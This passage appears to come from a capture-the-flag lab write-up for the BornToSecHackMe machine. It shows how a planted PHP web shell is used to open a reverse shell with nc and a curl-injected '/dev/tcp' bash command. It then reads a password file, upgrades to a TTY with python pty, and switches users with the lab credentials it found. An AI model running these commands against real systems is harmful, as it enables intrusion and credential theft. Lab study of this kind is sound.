# reverse shell

Because we have written php code in the file `/var/www/forum/templates_c/cmd.php` to execute any strings in the `cmd` parameter.  
We can obtain shell without using ssh method.  

## How to create a reverse shell ?

We must use our `attacker machine` to listen on one `port`.

```bash
nc -lvp PORT
```

Then the reverse shell command must be sent. In this example we have used `curl`: 

```bash
curl --insecure --get https://Boot2rootIP/forum/templates_c/cmd.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/AttackerIP/Port 0>&1'"
```

We have our reverse shell and we can explore the machine.

```bash
$nc -lvp 4444
listening on [any] 4444 ...
192.168.56.101: inverse host lookup failed: Unknown host
connect to [192.168.56.113] from (UNKNOWN) [192.168.56.101] 59423
bash: no job control in this shell
www-data@BornToSecHackMe:/var/www/forum/templates_c$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@BornToSecHackMe:/home$ cat /home/LOOKATME/password
cat /home/LOOKATME/password
lmezard:G!@M6f4Eatau{sF"
```

Now we have a shell access we can try to login with `lmezard`. We have a problem and to solve it we must to execute a shell using `TTY` mode (to create an `interactive shell`):
```bash
www-data@BornToSecHackMe:/var/www/forum/templates_c$ su lmezard
su lmezard
su: must be run from a terminal
www-data@BornToSecHackMe:/var/www/forum/templates_c$ python -c 'import pty; pty.spawn("/bin/bash")'
<ar/www/forum/templates_c$ python -c 'import pty; pty.spawn("/bin/bash")'    
www-data@BornToSecHackMe:/var/www/forum/templates_c$ su laurie
su laurie
Password: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```
